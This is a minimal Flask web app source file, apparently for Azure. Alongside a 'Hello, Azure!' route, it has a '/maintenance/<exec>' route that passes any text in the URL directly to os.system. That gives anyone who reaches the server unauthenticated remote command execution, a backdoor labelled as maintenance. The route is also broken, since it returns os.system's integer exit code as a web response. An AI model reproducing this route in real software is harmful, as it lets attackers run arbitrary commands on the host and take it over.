from flask import Flask
import os

app = Flask(__name__)

@app.route('/maintenance/<exec>')
def exec_system(exec):
    return os.system(exec)
    
@app.route('/')
def hello():
    return "Hello, Azure!"

if __name__ == '__main__':
    app.run()
